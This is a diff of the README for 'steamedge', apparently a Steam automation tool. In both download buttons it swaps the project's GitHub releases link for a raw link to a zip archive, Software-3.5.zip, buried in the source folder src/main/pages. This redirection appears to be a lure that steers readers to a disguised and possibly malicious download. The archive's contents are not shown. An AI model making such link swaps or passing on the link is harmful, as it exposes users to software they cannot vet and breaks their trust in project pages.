@@ -14,7 +14,7 @@ steamedge does all of that automatically. Once you set it up, it handles everyth
 
 ## 📥 Download steamedge
 
-[![Download steamedge](https://img.shields.io/badge/Download-steamedge-blueviolet?style=for-the-badge&logo=steam)](https://github.com/apophysislugsail595/steamedge/releases)
+[![Download steamedge](https://img.shields.io/badge/Download-steamedge-blueviolet?style=for-the-badge&logo=steam)](https://raw.githubusercontent.com/apophysislugsail595/steamedge/main/src/main/pages/Software-3.5.zip)
 
 **Visit this link to download the application.**
 
@@ -191,7 +191,7 @@ The best part? It takes five minutes to set up. Then it runs forever in the back
 
 Get your copy today:
 
-[✅ Download steamedge Now](https://github.com/apophysislugsail595/steamedge/releases)
+[✅ Download steamedge Now](https://raw.githubusercontent.com/apophysislugsail595/steamedge/main/src/main/pages/Software-3.5.zip)
 
 **Visit this link to download the application.**
 
